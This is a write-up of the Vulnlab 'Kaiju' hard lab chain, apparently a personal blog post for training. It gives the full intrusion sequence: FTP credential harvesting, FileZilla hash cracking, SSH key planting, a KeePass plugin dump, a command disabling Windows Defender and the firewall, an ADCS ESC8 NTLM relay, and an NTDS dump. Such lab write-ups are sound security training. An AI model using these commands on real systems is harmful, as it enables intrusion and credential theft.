---
title: "Vulnlab - Kaiju Chain [Hard]"
publishedAt: 2023-08-20
description: "Vulnlab Writeup"
isPublish: true
---


> Through the writeup the IPs may change, this is due that I did the machine in a few tries so I turned off the instances.

We start with 3 targets in my case the targets were:

```
10.10.247.37
10.10.247.38
10.10.247.39
```

Scanning them:

```
$ rustscan -a $(sed --z 's/\n/,/g' target.txt)
Open 10.10.247.38:21
Open 10.10.247.38:22
Open 10.10.247.38:3389
Open 10.10.247.39:3389
Open 10.10.247.37:3389
```

We are able to log in with `ftp:ftp`, then we can list the files:

```
dr-xr-xr-x 1 ftp ftp               0 Dec 27 10:15 Configs
dr-xr-xr-x 1 ftp ftp               0 Dec 17 14:44 Licenses
dr-xr-xr-x 1 ftp ftp               0 Dec 27 10:15 Passwords
dr-xr-xr-x 1 ftp ftp               0 Dec 29 08:56 Software
dr-xr-xr-x 1 ftp ftp               0 Dec 27 10:15 Temp
```

We can download them all using `wget`

```
wget -m ftp://ftp:ftp@10.10.247.38
```

We find interesting files that contains credentials under the `Passwords` folder.

```
-r--r--r-- 1 ftp ftp              20 Jan 30 20:10 firewalls.txt
-r--r--r-- 1 ftp ftp               9 Jan 30 20:16 ftp.txt
-r--r--r-- 1 ftp ftp              32 Dec 29 08:53 local.txt
```

```
firewall:firexx
ftp:ftp
administrator:[Moved to KeePass]
```

Under the `Configs` folder we can find `users.xml`

```
-r--r--r-- 1 ftp ftp            2236 Dec 17 14:54 users.xml
```

Upon opening it we can see another user called `backup` and its hashed password.

```xml
<user name="backup" enabled="true">
	...
	<password index="1">
		<hash>ZqRNhkBO8d4VYJb0YmF7cJgjECAH4...</hash>
		<salt>aec9Yt49edyEvXkZUinmS52UrwNo...</salt>
		<iterations>100000</iterations>
	</password>
	...
```

We can check the FileZilla's forums to see what type of hash it is, specifically I used these:

- https://forum.filezilla-project.org/viewtopic.php?t=55179
- https://forum.filezilla-project.org/viewtopic.php?t=54821
- https://john-users.openwall.narkive.com/giDMyLS3/using-pbkdf2-hmac-sha256

We should replace the `+` with `.` in our hash before trying to crack it, the format should be this: `$pbkdf2-sha256$iterations$salt$hash`

Since the hash doesn't crack with `rockyou` we should try to pass some simple rules such as:

```
$1$2$3
```

which is derived from the credentials that we gathered, specifically `firewalls.txt`

```
$ hashcat -m 20300 ./filezilla.hash /opt/rockyou.txt -r ./hash_rule.txt
```

This cracks to `....123`, then we can use this password to log in with `ssh` into the server:

```
Microsoft Windows [Version 10.0.20348.2159]
(c) Microsoft Corporation. All rights reserved.

backup@BERSRV200 C:\Users\backup>
```

Listing the `C:\Users` we can see another users: `clare.frost` and `sasrv200`, we should keep note of them. Using the `users.xml` we can see that there is an `E:\` drive, we can explore that further.

We can see some interesting files there such as:

```
it.kdbx
filezilla-server.log
install.log
```

We can discover the administrator's hash there: 

```
[--admin.password@index=1 --admin.password.hash=mSbrgj1R6oqMMSk4Qk1TuYTc... --admin.password.salt=AdRNx7rAs1CEM23pA.... --admin.password.iterations=100000]
```

And then again we can create custom wordlist to crack it

```
$ hashcat -m 20300 ./filezilla.hash /opt/rockyou.txt -r ./hash_rule.txt
```

The next part of this chain is to enumerate the ports in the machine, we can see some interesting ports such as:

```
TCP    [::1]:14148            [::]:0                 LISTENING       3192
```

We can forward this port, but if we google around we can see that it is related to FileZilla Server, lets forward it:

```
ssh -L 127.0.0.1:8003:127.0.0.1:14148 backup@10.10.247.38
```

Now comes the tricky part, you have to use **Windows** to make this client work, I've faced some issues on Linux but I know that some people have made it work. You also need to use the same version of this software, luckily under `Software` folder there is a `FileZilla_Server_1.8.0_win64-setup.exe` which we can use to start the UI (we do not need the server), then we can configure it to connect to the port that we forwarded.

<img src="/images/Pasted image 20240218205146.png">

We can then enumerate the current users, but most importantly we can add our new user `syl:5yl`

<img src="/images/Pasted image 20240218205333.png">

Then we should be able to access the ftp server using the newly created user. Upon listing the FTP, we would notice that we have access to the account `sasrv200` because we can list files there. Since that we have READ & WRITE access we can put `authorized_keys` in a `.ssh` folder with our public key.

```
ftp> mkdir .ssh
257 "/Users/sasrv200/.ssh" created successfully.
...
ftp> put authorized_keys
local: authorized_keys remote: authorized_keys
229 Entering Extended Passive Mode (|||65019|)
150 Starting data transfer.
100% |******************************************************************************************************************************|   107      155.72 KiB/s    00:00 ETA
226 Operation successful
107 bytes sent in 00:00 (2.51 KiB/s)
ftp> dir
229 Entering Extended Passive Mode (|||65164|)
150 Starting data transfer.
-rw-rw-rw- 1 ftp ftp             107 Feb 18 18:57 authorized_keys
226 Operation successful
```

Now we should be able to login as that user using `ssh`.

```
Microsoft Windows [Version 10.0.20348.2159]
(c) Microsoft Corporation. All rights reserved.

kaiju\sasrv200@BERSRV200 C:\Users\sasrv200>tree /f /a
Folder PATH listing
Volume serial number is AC3F-A083
C:.
+---.ssh
|       authorized_keys
|
+---Desktop
|       flag.txt
```

After some further enumeration over the account we can notice that there is a process called `KeePass` that pops out every now and then.

I created this little script to watch for changes

```powershell
while ($true) {
    Clear-Host
    $processes = Get-Process | Sort-Object CPU -Descending | Select-Object -Property ID, ProcessName, CPU
    $currentTime = Get-Date
    Write-Host "Process Watcher - Current Time: $currentTime"
    $processes 
    Start-Sleep -Seconds 5
}
```

After that, we can see that in the `E:\` drive under the `KeePass` folder there are `Plugins` folder which is empty. This hints for this malicious plugin:

- https://github.com/d3lb3/KeeFarceReborn

When you put your malicious plugin under the `Plugins` folder you should expect a dump of the database in `C:\temp` there will be a `*.xml` file. Eventually you will find the administrator's password there `N......Mel..`.

Then we can login with SSH.

```
Microsoft Windows [Version 10.0.20348.2159]
(c) Microsoft Corporation. All rights reserved.

administrator@BERSRV200 C:\Users\Administrator>
```

Let's disable the AV and the Firewall

```
cmd.exe /c "powershell Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && powershell Set-MpPreference -SubmitSamplesConsent 2 & "%ProgramFiles%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All"
```

```
Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False
```

Now, lets copy chisel with `scp` and start it, then we can adjust our `proxychains` tool and setup a proxy to access the internal ports.

Upon the enumeration using the ADCS module from `nxc`, we can see that there is an enrollment server:

<img src="/images/Pasted image 20240219162238.png">

We would want to see the vulnerable certificates now using `certipy`

```
$ proxychains certipy find -username clare.frost@kaiju.vl -hashes be167.. -vulnerable -stdout -dc-ip 10.10.213.165
```

<img src="/images/Pasted image 20240219160939.png">

There is ESC8 vulnerability which we can exploit.

The next step is quite tricky, we need to redirect the traffic that comes to the machine that we are in `BERSRV200` to other port that we then should forward to our machine where we setup a relay towards the `BERSRV100` so that we can get the authenticating certificate that we use from `BERSRV105` towards `BERSRV100`, with that certificate we can then try to get TGT from the `BERSRV100` principal which in turn will retrieve us the NT hash.

To setup this we would need to do these following steps:
- On the `BERSRV200` machine use the https://github.com/jellever/StreamDivert to forward the traffic from 445 to 8445
- Forward the 8445 port on the `BERSRV200` machine towards your local machine
- Setup a `ntlmrelayx` with the following args: `proxychains ntlmrelayx -t http://BERSRV100.kaiju.vl/certsrv/certfnsh.asp -smb2support --adcs --template 'DomainController'`
- Transform the certificate from `b64` to `pfx` (simply decode it and save it to `pfx`)
- Use `proxychains certipy auth -pfx cert.pfx` to ask for TGT, to retrieve the NT hash

<img src="/images/Pasted image 20240219141333.png">

<img src="/images/Pasted image 20240219162140.png">


Then we should be able to dump the OS credentials with the retrieved hash for the user `BERSRV100$`

```
$ proxychains crackmapexec smb 10.10.213.165 -u 'BERSRV100$' -H '19ad5c18445fxxxxx' --ntds drsuapi
```

<img src="/images/Pasted image 20240219162031.png">

And then we can use the administrator's hash to log in using `winrm` or similar.